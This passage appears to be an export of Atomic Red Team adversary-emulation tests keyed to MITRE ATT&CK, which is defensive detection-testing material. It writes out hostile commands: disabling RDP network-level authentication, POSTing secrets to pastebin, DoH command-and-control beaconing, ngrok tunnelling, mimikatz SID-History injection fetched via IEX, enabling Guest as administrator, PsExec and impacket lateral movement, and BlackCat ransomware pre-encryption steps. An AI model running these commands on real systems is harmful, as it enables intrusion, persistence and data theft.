input_arguments.NEW_Remote_Port.type: string

input_arguments.NEW_Remote_Port.default: 4489

"
T1021.001,Remote Services: Remote Desktop Protocol,Disable NLA for RDP via Command Prompt,01d1c6c0-faf0-408e-b368-752a02285cb2,"Disables network-level authentication (NLA) for RDP by changing a registry key via Command Prompt
Disabling NLA for RDP can allow remote user interaction with the Windows sign-in screen prior to authentication. According to Microsoft, Flax Typhoon actors used this technique implementation to achieve persistence on victim systems: https://www.microsoft.com/en-us/security/blog/2023/08/24/flax-typhoon-using-legitimate-software-to-quietly-access-taiwanese-organizations/
See also: https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/management/enable_rdp.py
",windows,,,"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /d 0 /t REG_DWORD /f
",command_prompt,,,"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /d #{Default_UserAuthentication} /t REG_DWORD -f >nul 2>&1
",,,"input_arguments.Default_UserAuthentication.description: Default UserAuthentication registry value

input_arguments.Default_UserAuthentication.type: string

input_arguments.Default_UserAuthentication.default: 1

"
T1567.003,Exfiltration Over Web Service: Exfiltration to Text Storage Sites,Exfiltrate data with HTTP POST to text storage sites - pastebin.com (Windows),c2e8ab6e-431e-460a-a2aa-3bc6a32022e3,"This test uses HTTP POST to exfiltrate data to a remote text storage site. (pastebin)                             
See https://web.archive.org/web/20201107203304/https://www.echosec.net/blog/what-is-pastebin-and-why-do-hackers-love-it                
",windows,,,"$apiKey = ""#{api_key}""
$content = ""secrets, api keys, passwords...""
$url = ""https://pastebin.com/api/api_post.php""
$postData = @{
  api_dev_key   = $apiKey
  api_option    = ""paste""
  api_paste_code = $content
}
$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData
Write-Host ""Your paste URL: $response""
",powershell,False,,,,,"input_arguments.api_key.description: Pastebin API key

input_arguments.api_key.type: string

input_arguments.api_key.default: 6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0

"
T1125,Video Capture,Registry artefact when application use webcam,6581e4a7-42e3-43c5-a0d2-5a0d62f9702a,"[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)
",windows,,,"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f
",command_prompt,,,"reg DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /f
",,,
T1572,Protocol Tunneling,DNS over HTTPS Large Query Volume,ae9ef4b0-d8c1-49d4-8758-06206f19af0a,"This test simulates an infected host sending a large volume of DoH queries to a command and control server.
The intent of this test is to trigger threshold based detection on the number of DoH queries either from a single source system or to a single targe domain.
A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.
",windows,,,"for($i=0; $i -le #{query_volume}; $i++) { (Invoke-WebRequest ""#{doh_server}?name=#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}&type=#{query_type}"" -UseBasicParsing).Content }
",powershell,,,,,,"input_arguments.doh_server.description: Default DoH resolver

input_arguments.doh_server.type: string

input_arguments.doh_server.default: https://8.8.8.8/resolve

input_arguments.query_type.description: DNS query type

input_arguments.query_type.type: string

input_arguments.query_type.default: TXT

input_arguments.subdomain.description: Subdomain prepended to the domain name

input_arguments.subdomain.type: string

input_arguments.subdomain.default: atomicredteam

input_arguments.query_volume.description: Number of DNS queries to send

input_arguments.query_volume.type: integer

input_arguments.query_volume.default: 1000

input_arguments.domain.description: Default domain to simulate against

input_arguments.domain.type: string

input_arguments.domain.default: 127.0.0.1.xip.io

"
T1572,Protocol Tunneling,DNS over HTTPS Regular Beaconing,0c5f9705-c575-42a6-9609-cbbff4b2fc9b,"This test simulates an infected host beaconing via DoH queries to a command and control server at regular intervals over time.
This behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.
A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.
",windows,,,"Set-Location ""PathToAtomicsFolder""
.\T1572\src\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
",powershell,,,,,,"input_arguments.doh_server.description: Default DoH resolver

input_arguments.doh_server.type: string

input_arguments.doh_server.default: https://8.8.8.8/resolve

input_arguments.runtime.description: Time in minutes to run the simulation

input_arguments.runtime.type: integer

input_arguments.runtime.default: 30

input_arguments.domain.description: Default domain to simulate against

input_arguments.domain.type: string

input_arguments.domain.default: 127.0.0.1.xip.io

input_arguments.subdomain.description: Subdomain prepended to the domain name

input_arguments.subdomain.type: string

input_arguments.subdomain.default: atomicredteam

input_arguments.query_type.description: DNS query type

input_arguments.query_type.type: string

input_arguments.query_type.default: TXT

input_arguments.c2_interval.description: Seconds between C2 requests to the command and control server

input_arguments.c2_interval.type: integer

input_arguments.c2_interval.default: 30

input_arguments.c2_jitter.description: Percentage of jitter to add to the C2 interval to create variance in the times between C2 requests

input_arguments.c2_jitter.type: integer

input_arguments.c2_jitter.default: 20

"
T1572,Protocol Tunneling,DNS over HTTPS Long Domain Query,748a73d5-cea4-4f34-84d8-839da5baa99c,"This test simulates an infected host returning data to a command and control server using long domain names.
The simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.
 Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.
",windows,,,"Set-Location ""PathToAtomicsFolder""
.\T1572\src\T1572-doh-domain-length.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
",powershell,,,,,,"input_arguments.doh_server.description: Default DoH resolver

input_arguments.doh_server.type: string

input_arguments.doh_server.default: https://8.8.8.8/resolve

input_arguments.query_type.description: DNS query type

input_arguments.query_type.type: string

input_arguments.query_type.default: TXT

input_arguments.subdomain.description: Subdomain prepended to the domain name (should be 63 characters to test maximum length)

input_arguments.subdomain.type: string

input_arguments.subdomain.default: atomicredteamatomicredteamatomicredteamatomicredteamatomicredte

input_arguments.domain.description: Default domain to simulate against

input_arguments.domain.type: string

input_arguments.domain.default: 127.0.0.1.xip.io

"
T1572,Protocol Tunneling,run ngrok,4cdc9fc7-53fb-4894-9f0c-64836943ea60,"Download and run ngrok. Create tunnel to chosen port.
",windows,,,"C:\Users\Public\ngrok\ngrok.exe config add-authtoken #{api_token} | Out-Null
Start-Job -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe tcp #{port_num} } | Out-Null
Start-Sleep -s 5 
Stop-Job -Name Job1 | Out-Null
",powershell,True,,"Remove-Item C:\Users\Public\ngrok -Recurse -ErrorAction Ignore
Remove-Item C:\%userprofile%\AppData\Local\ngrok -ErrorAction Ignore
",powershell,"dependencies.0.description: Download ngrok

dependencies.0.prereq_command: if (Test-Path C:\Users\Public\ngrok) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Path C:\Users\Public\ngrok -ItemType Directory | Out-Null
Invoke-WebRequest #{download} -OutFile C:\Users\Public\ngrok\ngrok-v3-stable-windows-amd64.zip
Expand-Archive C:\Users\Public\ngrok\ngrok-v3-stable-windows-amd64.zip -DestinationPath C:\Users\Public\ngrok

","input_arguments.api_token.description: ngrok API

input_arguments.api_token.type: string

input_arguments.api_token.default: N/A

input_arguments.port_num.description: port number for tunnel

input_arguments.port_num.type: integer

input_arguments.port_num.default: 3389

input_arguments.download.description: link to download ngrok

input_arguments.download.type: string

input_arguments.download.default: https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip

"
T1129,Server Software Component,ESXi - Install a custom VIB on an ESXi host,7f843046-abf2-443f-b880-07a83cf968ec,"An adversary can maintain persistence within an ESXi host by installing malicious vSphere Installation Bundles (VIBs).
[Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-malware-persistence)
",windows,,,"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp
echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh  -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}""
",command_prompt,False,,"echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh  -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_remove}""
",powershell,"dependencies.0.description: Check if plink and pscp are available.

dependencies.0.prereq_command: if (Test-Path ""#{plink_file}"") {exit 0} else {exit 1}
if (Test-Path ""#{pscp_file}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\plink.exe""
Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\pscp.exe""

","input_arguments.vm_host.description: Specify the host name of the ESXi Server

input_arguments.vm_host.type: string

input_arguments.vm_host.default: atomic.local

input_arguments.vm_user.description: Specify the privilege user account on ESXi Server

input_arguments.vm_user.type: string

input_arguments.vm_user.default: root

input_arguments.vm_pass.description: Specify the privilege user password on ESXi Server

input_arguments.vm_pass.type: string

input_arguments.vm_pass.default: pass

input_arguments.plink_file.description: Path to plink

input_arguments.plink_file.type: path

input_arguments.plink_file.default: PathToAtomicsFolder\..\ExternalPayloads\plink.exe

input_arguments.pscp_file.description: Path to Pscp

input_arguments.pscp_file.type: path

input_arguments.pscp_file.default: PathToAtomicsFolder\..\ExternalPayloads\pscp.exe

input_arguments.vib_install.description: Path to script with commands to install the vib

input_arguments.vib_install.type: path

input_arguments.vib_install.default: PathToAtomicsFolder\..\atomics\T1129\src\esxi_vibinstall.txt

input_arguments.vib_remove.description: Path to script with commands to remove the vib

input_arguments.vib_remove.type: path

input_arguments.vib_remove.default: PathToAtomicsFolder\..\atomics\T1129\src\esxi_vibremove.txt

input_arguments.vib_file.description: Path to the dummy vib

input_arguments.vib_file.type: path

input_arguments.vib_file.default: PathToAtomicsFolder\..\atomics\T1129\src\atomicvibes.vib

"
T1546.007,Event Triggered Execution: Netsh Helper DLL,Netsh Helper DLL Registration,3244697d-5a3a-4dfc-941c-550f69f91a4d,"You can register a ""helper dll"" with Netsh as a persistance mechanism. The code in the dll is executed every time netsh.exe is called.
The NetshHelper.dll provided with the atomic will simply launch notepad when netsh.exe is run.

[Blog](https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html)
[Sample DLL code](https://github.com/outflanknl/NetshHelperBeacon)
",windows,,,"netsh.exe add helper ""#{helper_file}""
taskkill /im notepad.exe /t /f > NUL 2>&1
",command_prompt,True,,"netsh.exe delete helper ""#{helper_file}""
",powershell,"dependencies.0.description: Helper DLL must exist on disk at specified location (#{helper_file})

dependencies.0.prereq_command: if (Test-Path ""#{helper_file}"") { exit 0} else { exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{helper_file}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.007/bin/NetshHelper.dll"" -OutFile ""#{helper_file}""

","input_arguments.helper_file.description: Path to DLL

input_arguments.helper_file.type: path

input_arguments.helper_file.default: PathToAtomicsFolder\T1546.007\bin\NetshHelper.dll

"
T1134.005,Access Token Manipulation: SID-History Injection,Injection SID-History with mimikatz,6bef32e5-9456-4072-8f14-35566fb85401,"Adversaries may use SID-History Injection to escalate privileges and bypass access controls. Must be run on domain controller
",windows,,,"#{mimikatz_path} ""privilege::debug"" ""sid::patch"" ""sid::add /sid:#{sid_to_inject} /sam:#{sam_account_name}"" ""exit""
",command_prompt,True,,"#{mimikatz_path} ""sid::clear /sam:#{sam_account_name}"" ""exit""
",powershell,"dependencies.0.description: Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})

dependencies.0.prereq_command: $mimikatz_path = cmd /c echo #{mimikatz_path}
if (Test-Path $mimikatz_path) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing) 
$releases = ""https://api.github.com/repos/gentilkiwi/mimikatz/releases""
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith("".zip"") }
$mimikatz_exe = cmd /c echo #{mimikatz_path}
$basePath = Split-Path $mimikatz_exe | Split-Path
Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath

","input_arguments.sid_to_inject.description: SID to inject into sidhistory

input_arguments.sid_to_inject.type: string

input_arguments.sid_to_inject.default: S-1-5-21-1004336348-1177238915-682003330-1134

input_arguments.sam_account_name.description: Target account to modify

input_arguments.sam_account_name.type: string

input_arguments.sam_account_name.default: $env:username

input_arguments.mimikatz_path.description: Mimikatz windows executable

input_arguments.mimikatz_path.type: path

input_arguments.mimikatz_path.default: PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe

"
T1078.001,Valid Accounts: Default Accounts,Enable Guest account with RDP capability and admin privileges,99747561-ed8d-47f2-9c91-1e5fde1ed6e0,"After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
and desktop will allow multiple RDP connections.
",windows,,,"net user #{guest_user} /active:yes
net user #{guest_user} #{guest_password}
net localgroup #{local_admin_group} #{guest_user} /add
net localgroup ""#{remote_desktop_users_group_name}"" #{guest_user} /add
reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v ""AllowTSConnections"" /t REG_DWORD /d 0x1 /f",command_prompt,True,,"net user #{guest_user} /active:no >nul 2>&1
net localgroup #{local_admin_group} #{guest_user} /delete >nul 2>&1
net localgroup ""#{remote_desktop_users_group_name}"" #{guest_user} /delete >nul 2>&1
if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /f >nul 2>&1)
if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete ""hklm\system\CurrentControlSet\Control\Terminal Server"" /v ""AllowTSConnections"" /f >nul 2>&1)",,,"input_arguments.guest_user.description: Specify the guest account

input_arguments.guest_user.type: string

input_arguments.guest_user.default: guest

input_arguments.guest_password.description: Specify the guest password

input_arguments.guest_password.type: string

input_arguments.guest_password.default: Password123!

input_arguments.local_admin_group.description: Specify the admin localgroup name

input_arguments.local_admin_group.type: string

input_arguments.local_admin_group.default: Administrators

input_arguments.remote_desktop_users_group_name.description: Specify the remote desktop users group name

input_arguments.remote_desktop_users_group_name.type: string

input_arguments.remote_desktop_users_group_name.default: Remote Desktop Users

input_arguments.remove_rdp_access_during_cleanup.description: Set to 1 if you want the cleanup to remove RDP access to machine

input_arguments.remove_rdp_access_during_cleanup.type: integer

input_arguments.remove_rdp_access_during_cleanup.default: 0

"
T1078.001,Valid Accounts: Default Accounts,Activate Guest Account,aa6cb8c4-b582-4f8e-b677-37733914abda,"The Adversaries can activate the default Guest user. The guest account is inactivated by default
",windows,,,"net user #{guest_user} /active:yes
",command_prompt,True,,"net user #{guest_user} /active:no
",,,"input_arguments.guest_user.description: Specify the guest account

input_arguments.guest_user.type: string

input_arguments.guest_user.default: guest

"
T1078.001,Valid Accounts: Default Accounts,Enable Guest Account on macOS,0315bdff-4178-47e9-81e4-f31a6d23f7e4,This test enables the guest account on macOS using sysadminctl utility.,macos,,,sudo sysadminctl -guestAccount on,command_prompt,True,,sudo sysadminctl -guestAccount off,,,
T1569.002,System Services: Service Execution,Execute a Command as a Service,2382dee2-a75f-49aa-9378-f52df6ed3fb1,"Creates a service specifying an arbitrary command and executes it. When executing commands such as PowerShell, the service will report that it did not start correctly even when code executes properly.

Upon successful execution, cmd.exe creates a new service using sc.exe that will start powershell.exe to create a new file `art-marker.txt`

[BlackCat Ransomware (ALPHV)](https://www.varonis.com/blog/blackcat-ransomware)  
[Cybereason vs. BlackCat Ransomware](https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware)
",windows,,,"sc.exe create #{service_name} binPath= ""#{executable_command}""
sc.exe start #{service_name}
sc.exe delete #{service_name}
",command_prompt,True,,"del C:\art-marker.txt >nul 2>&1
",,,"input_arguments.service_name.description: Name of service to create

input_arguments.service_name.type: string

input_arguments.service_name.default: ARTService

input_arguments.executable_command.description: Command to execute as a service

input_arguments.executable_command.type: string

input_arguments.executable_command.default: %COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt

"
T1569.002,System Services: Service Execution,Use PsExec to execute a command on a remote host,873106b7-cfed-454b-8680-fa9f6400431c,"Requires having Sysinternals installed, path to sysinternals is one of the input input_arguments
Will start a process on a remote host.

Upon successful execution, cmd will utilize psexec.exe to spawn calc.exe on a remote endpoint (default:localhost).
",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" \\#{remote_host} -u #{user_name} -p #{password} -accepteula ""C:\Windows\System32\calc.exe""
",command_prompt,,,,powershell,"dependencies.0.description: PsExec tool from Sysinternals must exist in the ExternalPayloads directory

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"") { exit 0} else { exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://download.sysinternals.com/files/PSTools.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\PsTools"" -Force
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe"" ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" -Force

","input_arguments.remote_host.description: Remote hostname or IP address

input_arguments.remote_host.type: string

input_arguments.remote_host.default: localhost

input_arguments.user_name.description: Username

input_arguments.user_name.type: string

input_arguments.user_name.default: DOMAIN\Administrator

input_arguments.password.description: Password

input_arguments.password.type: string

input_arguments.password.default: P@ssw0rd1

"
T1569.002,System Services: Service Execution,psexec.py (Impacket),edbcd8c9-3639-4844-afad-455c91e95a35,"Will execute a command on the remote host with Impacket psexec.py script.
",linux,,,"psexec.py '#{domain}/#{username}:#{password}@#{remote_host}' '#{command}'
",bash,,,,bash,"dependencies.0.description: psexec.py (Impacket)

dependencies.0.prereq_command: if [ -x ""$(command -v psexec.py)"" ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: sudo pip3 install impacket

","input_arguments.remote_host.description: Remote hostname or IP address

input_arguments.remote_host.type: string

input_arguments.remote_host.default: 127.0.0.1

input_arguments.username.description: Username

input_arguments.username.type: string

input_arguments.username.default: Administrator

input_arguments.domain.description: Target domain

input_arguments.domain.type: string

input_arguments.domain.default: 

input_arguments.password.description: Password

input_arguments.password.type: string

input_arguments.password.default: P@ssw0rd1

input_arguments.command.description: Command to execute in target computer

input_arguments.command.type: string

input_arguments.command.default: whoami

"
T1569.002,System Services: Service Execution,BlackCat pre-encryption cmds with Lateral Movement,31eb7828-97d7-4067-9c1e-c6feb85edc4b,This atomic attempts to emulate the unique behavior of BlackCat ransomware prior to encryption and during Lateral Movement attempts via PsExec on Windows. Uses bundled PsExec like BlackCat,windows,,,"cmd.exe /c ""wmic 	csproduct 	get UUID"" 
cmd.exe /c ""fsutil behavior 	set SymlinkEvaluation R2L:1"" 
cmd.exe /c ""fsutil behavior set 	SymlinkEvaluation R2R:1""
reg    add    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      
copy ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" $env:temp
cmd.exe /c ""$env:temp\psexec.exe  -accepteula  \\#{targethost} cmd.exe  /c echo ""--access-token""""
",powershell,True,,"reg delete HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v MaxMpxCt /f
cmd.exe /c ""fsutil behavior set SymlinkEvaluation R2L:0"" 
cmd.exe /c ""fsutil behavior set SymlinkEvaluation R2R:0""
rm $env:temp\psexec.exe
",,"dependencies.0.description: PsExec must exist on disk at ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe""

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Invoke-WebRequest ""https://download.sysinternals.com/files/PSTools.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\PsTools"" -Force
New-Item -ItemType Directory (Split-Path ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"") -Force | Out-Null
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe"" ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" -Force

","input_arguments.targethost.description: Target hostname to attempt psexec connection to for emulation of lateral movement.

input_arguments.targethost.type: string

input_arguments.targethost.default: $ENV:COMPUTERNAME

"
T1569.002,System Services: Service Execution,Use RemCom to execute a command on a remote host,a5d8cdeb-be90-43a9-8b26-cc618deac1e0,"Requires having RemCom installed, path to RemCom is one of the input input_arguments
Will start a process on a remote host.
Upon successful execution, cmd will utilize RemCom.exe to spawn calc.exe on a remote endpoint (default:localhost).
",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\remcom.exe"" \\#{remote_host} /user:#{user_name} /pwd:#{password} cmd.exe
",command_prompt,,,,powershell,"dependencies.0.description: RemCom tool must exist on disk in the ExternalPayloads folder

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\remcom.exe"") { exit 0} else { exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/kavika13/RemCom/raw/master/bin/Release/RemCom.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\remcom.exe""

","input_arguments.remote_host.description: Remote hostname or IP address

input_arguments.remote_host.type: string

input_arguments.remote_host.default: localhost

input_arguments.user_name.description: Username

input_arguments.user_name.type: string

input_arguments.user_name.default: Administrator

input_arguments.password.description: Password

input_arguments.password.type: string

input_arguments.password.default: P@ssw0rd1

"
T1569.002,System Services: Service Execution,Snake Malware Service Create,b8db787e-dbea-493c-96cb-9272296ddc49,"The following Atomic Test will create a new service named WerFaultSvc with a binary path of WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\WerFault.exe.
This was recently seen in the Snake Malware report. 
Upon execution, sc.exe will create a new service named WerFaultSvc with a bin path \WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\WerFault.exe and a display name of WerFault Service.
[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  
",windows,,,"sc.exe create ""WerFaultSvc"" binPath= ""$env:windir\WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\WerFault.exe"" DisplayName= ""WerFault Service"" start= auto
",command_prompt,True,,"sc.exe delete ""WerFaultSvc""
",,,
T1140,Deobfuscate/Decode Files or Information,Deobfuscate/Decode Files Or Information,dc6fe391-69e6-4506-bd06-ea5eeb4082f8,"Encode/Decode executable
Upon execution a file named T1140_calc_decoded.exe will be placed in the temp folder
",windows,,,"certutil -encode #{executable} %temp%\T1140_calc.txt
certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe
",command_prompt,,,"del %temp%\T1140_calc.txt >nul 2>&1
del %temp%\T1140_calc_decoded.exe >nul 2>&1
",,,"input_arguments.executable.description: name of executable

input_arguments.executable.type: path

input_arguments.executable.default: C:\Windows\System32\calc.exe

"
T1140,Deobfuscate/Decode Files or Information,Certutil Rename and Decode,71abc534-3c05-4d0c-80f7-cbe93cb2aa94,"Rename certutil and decode a file. This is in reference to latest research by FireEye [here](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)
",windows,,,"copy %windir%\system32\certutil.exe %temp%\tcm.tmp
%temp%\tcm.tmp -encode #{executable} %temp%\T1140_calc2.txt
%temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe
",command_prompt,,,"del %temp%\tcm.tmp >nul 2>&1
del %temp%\T1140_calc2.txt >nul 2>&1
del %temp%\T1140_calc2_decoded.exe >nul 2>&1
",,,"input_arguments.executable.description: name of executable/file to decode

input_arguments.executable.type: path

input_arguments.executable.default: C:\Windows\System32\calc.exe

"
T1140,Deobfuscate/Decode Files or Information,Base64 decoding with Python,356dc0e8-684f-4428-bb94-9313998ad608,"Use Python to decode a base64-encoded text string and echo it to the console
",linux,macos,,"ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(""#{message}"".encode());print(enc.decode())')
python3 -c ""import base64;dec=base64.b64decode(\""$ENCODED\"");print(dec.decode())""
python3 -c ""import base64 as d;dec=d.b64decode(\""$ENCODED\"");print(dec.decode())""
python3 -c ""from base64 import b64decode;dec=b64decode(\""$ENCODED\"");print(dec.decode())""
python3 -c ""from base64 import b64decode as d;dec=d(\""$ENCODED\"");print(dec.decode())""
echo $ENCODED | python3 -c ""import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())""
echo $ENCODED > #{encoded_file} && python3 -c ""import base64;dec=base64.b64decode(open('#{encoded_file}').read());print(dec.decode())""
",sh,False,,,,"dependencies.0.description: Python must be present

dependencies.0.prereq_command: which python3

dependencies.0.get_prereq_command: echo ""Please install Python 3""

","input_arguments.message.description: Message to print to the screen

input_arguments.message.type: string

input_arguments.message.default: Hello from Atomic Red Team test T1140!

input_arguments.encoded_file.description: File to temporarily save encoded text

input_arguments.encoded_file.type: path

input_arguments.encoded_file.default: /tmp/T1140.encoded

"
T1140,Deobfuscate/Decode Files or Information,Base64 decoding with Perl,6604d964-b9f6-4d4b-8ce8-499829a14d0a,"Use Perl to decode a base64-encoded text string and echo it to the console    
",linux,macos,,"ENCODED=$(perl -e ""use MIME::Base64;print(encode_base64('#{message}'));"")
perl -le ""use MIME::Base64;print(decode_base64('$ENCODED'));""
echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'
echo $ENCODED > #{encoded_file} && perl -le 'use MIME::Base64;open($f,""<"",""#{encoded_file}"");print(decode_base64(<$f>));'
",sh,False,,,,"dependencies.0.description: Perl must be present

dependencies.0.prereq_command: which perl

dependencies.0.get_prereq_command: echo ""Please install Perl""

","input_arguments.message.description: Message to print to the screen

input_arguments.message.type: string

input_arguments.message.default: Hello from Atomic Red Team test T1140!

input_arguments.encoded_file.description: File to temporarily save encoded text

input_arguments.encoded_file.type: path

input_arguments.encoded_file.default: /tmp/T1140.encoded

"
T1140,Deobfuscate/Decode Files or Information,Base64 decoding with shell utilities,b4f6a567-a27a-41e5-b8ef-ac4b4008bb7e,"Use common shell utilities to decode a base64-encoded text string and echo it to the console
",linux,macos,,"ENCODED=$(echo '#{message}' | base64)
printf $ENCODED | base64 -d
echo $ENCODED | base64 -d
echo $(echo $ENCODED) | base64 -d
echo $ENCODED > #{encoded_file} && base64 -d #{encoded_file}
echo $ENCODED > #{encoded_file} && base64 -d < #{encoded_file}
echo $ENCODED > #{encoded_file} && cat #{encoded_file} | base64 -d
echo $ENCODED > #{encoded_file} && cat < #{encoded_file} | base64 -d
bash -c ""{echo,\""$(echo $ENCODED)\""}|{base64,-d}""
",sh,False,,,,,"input_arguments.message.description: Message to print to the screen

input_arguments.message.type: string

input_arguments.message.default: Hello from Atomic Red Team test T1140!

input_arguments.encoded_file.description: File to temporarily save encoded text

input_arguments.encoded_file.type: path

input_arguments.encoded_file.default: /tmp/T1140.encoded

"
T1140,Deobfuscate/Decode Files or Information,Base64 decoding with shell utilities (freebsd),b6097712-c42e-4174-b8f2-4b1e1a5bbb3d,"Use common shell utilities to decode a base64-encoded text string and echo it to the console
